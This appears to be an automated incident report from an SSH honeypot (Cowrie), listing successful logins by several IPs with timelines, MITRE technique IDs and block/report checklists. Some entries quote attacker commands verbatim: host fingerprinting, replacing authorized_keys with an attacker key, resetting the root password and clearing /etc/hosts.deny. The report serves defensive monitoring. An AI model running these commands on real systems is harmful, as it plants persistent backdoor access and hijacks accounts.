| **Source IP** | `138.197.172.49` |
| **First Seen** | 2026-03-09 08:06 |
| **Last Seen** | 2026-03-09 08:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:06:57` | `cowrie.session.connect` |
| `2026-03-09 08:06:57` | `cowrie.client.version` |
| `2026-03-09 08:06:57` | `cowrie.client.kex` |
| `2026-03-09 08:06:59` | `cowrie.login.success` |
| `2026-03-09 08:06:59` | `cowrie.session.params` |
| `2026-03-09 08:06:59` | `cowrie.command.input` |
| `2026-03-09 08:06:59` | `cowrie.command.input` |
| `2026-03-09 08:06:59` | `cowrie.command.input` |
| `2026-03-09 08:06:59` | `cowrie.command.input` |
| `2026-03-09 08:07:00` | `cowrie.log.closed` |
| `2026-03-09 08:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.172.49` to AbuseIPDB if not already reported
- [ ] Block `138.197.172.49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-334a9d293780

| Field | Detail |
|---|---|
| **Source IP** | `138.197.172.49` |
| **First Seen** | 2026-03-09 08:07 |
| **Last Seen** | 2026-03-09 08:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:07:40` | `cowrie.session.connect` |
| `2026-03-09 08:07:40` | `cowrie.client.version` |
| `2026-03-09 08:07:40` | `cowrie.client.kex` |
| `2026-03-09 08:07:42` | `cowrie.login.success` |
| `2026-03-09 08:07:43` | `cowrie.session.params` |
| `2026-03-09 08:07:43` | `cowrie.command.input` |
| `2026-03-09 08:07:43` | `cowrie.command.input` |
| `2026-03-09 08:07:43` | `cowrie.command.input` |
| `2026-03-09 08:07:43` | `cowrie.command.input` |
| `2026-03-09 08:07:43` | `cowrie.log.closed` |
| `2026-03-09 08:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.172.49` to AbuseIPDB if not already reported
- [ ] Block `138.197.172.49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa8a979cbee1

| Field | Detail |
|---|---|
| **Source IP** | `138.197.172.49` |
| **First Seen** | 2026-03-09 08:08 |
| **Last Seen** | 2026-03-09 08:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:08:27` | `cowrie.session.connect` |
| `2026-03-09 08:08:27` | `cowrie.client.version` |
| `2026-03-09 08:08:27` | `cowrie.client.kex` |
| `2026-03-09 08:08:28` | `cowrie.login.success` |
| `2026-03-09 08:08:28` | `cowrie.session.params` |
| `2026-03-09 08:08:28` | `cowrie.command.input` |
| `2026-03-09 08:08:28` | `cowrie.command.input` |
| `2026-03-09 08:08:28` | `cowrie.command.input` |
| `2026-03-09 08:08:28` | `cowrie.command.input` |
| `2026-03-09 08:08:28` | `cowrie.log.closed` |
| `2026-03-09 08:08:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.172.49` to AbuseIPDB if not already reported
- [ ] Block `138.197.172.49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ab477ad308

| Field | Detail |
|---|---|
| **Source IP** | `120.92.15.204` |
| **First Seen** | 2026-03-09 08:22 |
| **Last Seen** | 2026-03-09 08:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 08:22:58` | `cowrie.session.connect` |
| `2026-03-09 08:22:58` | `cowrie.client.version` |
| `2026-03-09 08:22:58` | `cowrie.client.kex` |
| `2026-03-09 08:22:58` | `cowrie.login.success` |
| `2026-03-09 08:22:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.92.15.204` to AbuseIPDB if not already reported
- [ ] Block `120.92.15.204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b762a67b46e

| Field | Detail |
|---|---|
| **Source IP** | `178.128.50.27` |
| **First Seen** | 2026-03-09 10:11 |
| **Last Seen** | 2026-03-09 10:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 10:11:28` | `cowrie.session.connect` |
| `2026-03-09 10:11:28` | `cowrie.client.version` |
| `2026-03-09 10:11:28` | `cowrie.client.kex` |
| `2026-03-09 10:11:29` | `cowrie.login.success` |
| `2026-03-09 10:11:30` | `cowrie.session.params` |
| `2026-03-09 10:11:30` | `cowrie.command.input` |
| `2026-03-09 10:11:30` | `cowrie.command.input` |
| `2026-03-09 10:11:30` | `cowrie.command.input` |
| `2026-03-09 10:11:30` | `cowrie.command.input` |
| `2026-03-09 10:11:30` | `cowrie.log.closed` |
| `2026-03-09 10:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.50.27` to AbuseIPDB if not already reported
- [ ] Block `178.128.50.27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58bc06dbb2a5

| Field | Detail |
|---|---|
| **Source IP** | `178.128.50.27` |
| **First Seen** | 2026-03-09 10:12 |
| **Last Seen** | 2026-03-09 10:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 10:12:43` | `cowrie.session.connect` |
| `2026-03-09 10:12:43` | `cowrie.client.version` |
| `2026-03-09 10:12:43` | `cowrie.client.kex` |
| `2026-03-09 10:12:44` | `cowrie.login.success` |
| `2026-03-09 10:12:44` | `cowrie.session.params` |
| `2026-03-09 10:12:44` | `cowrie.command.input` |
| `2026-03-09 10:12:44` | `cowrie.command.input` |
| `2026-03-09 10:12:44` | `cowrie.command.input` |
| `2026-03-09 10:12:44` | `cowrie.command.input` |
| `2026-03-09 10:12:44` | `cowrie.log.closed` |
| `2026-03-09 10:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.50.27` to AbuseIPDB if not already reported
- [ ] Block `178.128.50.27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2733b2cbeed0

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137.80` |
| **First Seen** | 2026-03-09 10:33 |
| **Last Seen** | 2026-03-09 10:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 10:33:54` | `cowrie.session.connect` |
| `2026-03-09 10:33:54` | `cowrie.client.version` |
| `2026-03-09 10:33:54` | `cowrie.client.kex` |
| `2026-03-09 10:33:55` | `cowrie.login.success` |
| `2026-03-09 10:33:56` | `cowrie.session.params` |
| `2026-03-09 10:33:56` | `cowrie.command.input` |
| `2026-03-09 10:33:56` | `cowrie.command.failed` |
| `2026-03-09 10:33:56` | `cowrie.log.closed` |
| `2026-03-09 10:33:57` | `cowrie.session.params` |
| `2026-03-09 10:33:57` | `cowrie.command.input` |
| `2026-03-09 10:33:57` | `cowrie.session.file_download` |
| `2026-03-09 10:33:57` | `cowrie.log.closed` |
| `2026-03-09 10:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137.80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137.80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c492344f362

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137.80` |
| **First Seen** | 2026-03-09 10:34 |
| **Last Seen** | 2026-03-09 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 10:34:01` | `cowrie.session.connect` |
| `2026-03-09 10:34:01` | `cowrie.client.version` |
| `2026-03-09 10:34:01` | `cowrie.client.kex` |
| `2026-03-09 10:34:02` | `cowrie.login.success` |
| `2026-03-09 10:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137.80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137.80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-169259bb5cd0

| Field | Detail |
|---|---|
| **Source IP** | `120.48.181.192` |
| **First Seen** | 2026-03-09 13:36 |
| **Last Seen** | 2026-03-09 13:37 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:SOD7We6KASea"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | {'url': '', 'sha256': 'a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2'}, {'url': '', 'sha256': '01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b'} |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 13:36:23` | `cowrie.session.connect` |
| `2026-03-09 13:36:23` | `cowrie.client.version` |
| `2026-03-09 13:36:23` | `cowrie.client.kex` |
| `2026-03-09 13:36:25` | `cowrie.login.success` |
| `2026-03-09 13:36:25` | `cowrie.session.params` |
| `2026-03-09 13:36:25` | `cowrie.command.input` |
| `2026-03-09 13:36:25` | `cowrie.command.failed` |
| `2026-03-09 13:36:25` | `cowrie.log.closed` |
| `2026-03-09 13:36:26` | `cowrie.session.params` |
| `2026-03-09 13:36:26` | `cowrie.command.input` |
| `2026-03-09 13:36:26` | `cowrie.session.file_download` |
| `2026-03-09 13:36:26` | `cowrie.log.closed` |
| `2026-03-09 13:36:39` | `cowrie.session.params` |
| `2026-03-09 13:36:39` | `cowrie.command.input` |
| `2026-03-09 13:36:39` | `cowrie.log.closed` |
| `2026-03-09 13:36:40` | `cowrie.session.params` |
| `2026-03-09 13:36:40` | `cowrie.command.input` |
| `2026-03-09 13:36:40` | `cowrie.log.closed` |
| `2026-03-09 13:36:40` | `cowrie.session.params` |
| `2026-03-09 13:36:40` | `cowrie.command.input` |
| `2026-03-09 13:36:41` | `cowrie.session.file_download` |
| `2026-03-09 13:36:41` | `cowrie.log.closed` |
| `2026-03-09 13:36:43` | `cowrie.session.params` |
| `2026-03-09 13:36:43` | `cowrie.command.input` |
| `2026-03-09 13:36:43` | `cowrie.log.closed` |
| `2026-03-09 13:36:44` | `cowrie.session.params` |
| `2026-03-09 13:36:44` | `cowrie.command.input` |
| `2026-03-09 13:36:44` | `cowrie.log.closed` |
| `2026-03-09 13:36:46` | `cowrie.session.params` |
| `2026-03-09 13:36:46` | `cowrie.command.input` |
| `2026-03-09 13:36:46` | `cowrie.command.input` |
| `2026-03-09 13:36:46` | `cowrie.log.closed` |
| `2026-03-09 13:36:46` | `cowrie.session.params` |
| `2026-03-09 13:36:46` | `cowrie.command.input` |
| `2026-03-09 13:36:48` | `cowrie.log.closed` |
| `2026-03-09 13:36:48` | `cowrie.session.params` |
| `2026-03-09 13:36:48` | `cowrie.command.input` |
| `2026-03-09 13:36:49` | `cowrie.log.closed` |
| `2026-03-09 13:36:50` | `cowrie.session.params` |
| `2026-03-09 13:36:50` | `cowrie.command.input` |
| `2026-03-09 13:36:50` | `cowrie.log.closed` |
| `2026-03-09 13:36:51` | `cowrie.session.params` |
| `2026-03-09 13:36:51` | `cowrie.command.input` |
| `2026-03-09 13:36:51` | `cowrie.log.closed` |
| `2026-03-09 13:36:52` | `cowrie.session.params` |
| `2026-03-09 13:36:52` | `cowrie.command.input` |
| `2026-03-09 13:36:53` | `cowrie.log.closed` |
| `2026-03-09 13:36:55` | `cowrie.session.params` |
| `2026-03-09 13:36:55` | `cowrie.command.input` |
| `2026-03-09 13:36:55` | `cowrie.log.closed` |
| `2026-03-09 13:36:57` | `cowrie.session.params` |
| `2026-03-09 13:36:57` | `cowrie.command.input` |
| `2026-03-09 13:36:57` | `cowrie.log.closed` |
| `2026-03-09 13:36:58` | `cowrie.session.params` |
| `2026-03-09 13:36:58` | `cowrie.command.input` |
| `2026-03-09 13:36:58` | `cowrie.log.closed` |
| `2026-03-09 13:36:59` | `cowrie.session.params` |
| `2026-03-09 13:36:59` | `cowrie.command.input` |
| `2026-03-09 13:37:00` | `cowrie.log.closed` |
| `2026-03-09 13:37:00` | `cowrie.session.params` |
| `2026-03-09 13:37:00` | `cowrie.command.input` |
| `2026-03-09 13:37:02` | `cowrie.log.closed` |
| `2026-03-09 13:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.181.192` to AbuseIPDB if not already reported
- [ ] Block `120.48.181.192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01389393d0ea

| Field | Detail |
|---|---|
| **Source IP** | `209.38.85.24` |
| **First Seen** | 2026-03-09 15:37 |
| **Last Seen** | 2026-03-09 15:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 15:37:23` | `cowrie.session.connect` |
| `2026-03-09 15:37:24` | `cowrie.client.version` |
| `2026-03-09 15:37:24` | `cowrie.client.kex` |
| `2026-03-09 15:37:25` | `cowrie.login.success` |
| `2026-03-09 15:37:26` | `cowrie.session.params` |
| `2026-03-09 15:37:26` | `cowrie.command.input` |
| `2026-03-09 15:37:26` | `cowrie.command.input` |
| `2026-03-09 15:37:26` | `cowrie.command.input` |
| `2026-03-09 15:37:26` | `cowrie.command.input` |
| `2026-03-09 15:37:27` | `cowrie.log.closed` |
| `2026-03-09 15:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.85.24` to AbuseIPDB if not already reported
- [ ] Block `209.38.85.24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66aa3bd952fe

| Field | Detail |
|---|---|
| **Source IP** | `4.17.226.146` |
| **First Seen** | 2026-03-09 15:37 |
| **Last Seen** | 2026-03-09 15:38 |
| **Session Duration** | 87s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 15:37:27` | `cowrie.session.connect` |
| `2026-03-09 15:37:27` | `cowrie.client.version` |
| `2026-03-09 15:37:28` | `cowrie.client.kex` |
| `2026-03-09 15:37:29` | `cowrie.login.success` |
| `2026-03-09 15:38:54` | `cowrie.session.file_upload` |
| `2026-03-09 15:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.17.226.146` to AbuseIPDB if not already reported
- [ ] Block `4.17.226.146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47c463a242f0

| Field | Detail |
|---|---|
| **Source IP** | `209.38.85.24` |
| **First Seen** | 2026-03-09 15:38 |
| **Last Seen** | 2026-03-09 15:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 15:38:18` | `cowrie.session.connect` |
| `2026-03-09 15:38:18` | `cowrie.client.version` |
| `2026-03-09 15:38:19` | `cowrie.client.kex` |
| `2026-03-09 15:38:20` | `cowrie.login.success` |
| `2026-03-09 15:38:21` | `cowrie.session.params` |
| `2026-03-09 15:38:21` | `cowrie.command.input` |
| `2026-03-09 15:38:21` | `cowrie.command.input` |
| `2026-03-09 15:38:21` | `cowrie.command.input` |
| `2026-03-09 15:38:21` | `cowrie.command.input` |
| `2026-03-09 15:38:21` | `cowrie.log.closed` |
| `2026-03-09 15:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.85.24` to AbuseIPDB if not already reported
- [ ] Block `209.38.85.24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3150a1715cb9

| Field | Detail |
|---|---|
| **Source IP** | `209.38.85.24` |
| **First Seen** | 2026-03-09 15:39 |
| **Last Seen** | 2026-03-09 15:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 15:39:09` | `cowrie.session.connect` |
| `2026-03-09 15:39:09` | `cowrie.client.version` |
| `2026-03-09 15:39:09` | `cowrie.client.kex` |
| `2026-03-09 15:39:11` | `cowrie.login.success` |
| `2026-03-09 15:39:12` | `cowrie.session.params` |
| `2026-03-09 15:39:12` | `cowrie.command.input` |
| `2026-03-09 15:39:12` | `cowrie.command.input` |
| `2026-03-09 15:39:12` | `cowrie.command.input` |
| `2026-03-09 15:39:12` | `cowrie.command.input` |
| `2026-03-09 15:39:12` | `cowrie.log.closed` |
| `2026-03-09 15:39:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.85.24` to AbuseIPDB if not already reported
- [ ] Block `209.38.85.24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c813c9b390e7

| Field | Detail |
|---|---|
| **Source IP** | `209.38.85.24` |
| **First Seen** | 2026-03-09 15:39 |
| **Last Seen** | 2026-03-09 15:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 15:39:58` | `cowrie.session.connect` |
| `2026-03-09 15:39:59` | `cowrie.client.version` |
| `2026-03-09 15:39:59` | `cowrie.client.kex` |
| `2026-03-09 15:40:00` | `cowrie.login.success` |
| `2026-03-09 15:40:01` | `cowrie.session.params` |
| `2026-03-09 15:40:01` | `cowrie.command.input` |
| `2026-03-09 15:40:01` | `cowrie.command.input` |
| `2026-03-09 15:40:01` | `cowrie.command.input` |
| `2026-03-09 15:40:01` | `cowrie.command.input` |
| `2026-03-09 15:40:02` | `cowrie.log.closed` |
| `2026-03-09 15:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.85.24` to AbuseIPDB if not already reported
- [ ] Block `209.38.85.24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

